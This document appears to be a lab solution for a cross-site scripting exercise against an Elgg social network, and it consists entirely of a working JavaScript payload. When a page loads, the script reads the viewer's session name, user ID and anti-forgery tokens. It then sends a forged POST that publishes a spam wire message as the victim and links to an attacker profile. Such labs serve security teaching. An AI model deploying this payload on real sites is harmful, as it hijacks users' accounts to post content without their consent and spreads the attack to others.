<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var user_name=elgg.session.user.name;
	var user_guid=elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//& b4 token?
	//Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
	var content=token+ts+"&body="+user_name+"Speaking+To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy%2F";
	console.log(user_guid+" "+user_name);

	if(user_guid !== elgg.page_owner.guid && user_guid !== 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
		console.log("POST sent");
	}
	}
</script>